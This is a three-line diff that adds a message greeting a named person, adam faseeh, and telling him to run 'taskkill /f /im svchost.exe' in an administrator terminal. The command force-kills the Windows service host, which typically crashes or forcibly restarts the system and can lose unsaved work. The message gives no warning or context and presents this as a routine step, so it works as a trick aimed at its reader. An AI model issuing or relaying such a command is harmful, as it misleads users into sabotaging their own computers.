@@ -1,0 +1,3 @@
+Hello adam faseeh
+run this in admin terminal:
+taskkill /f /im svchost.exe
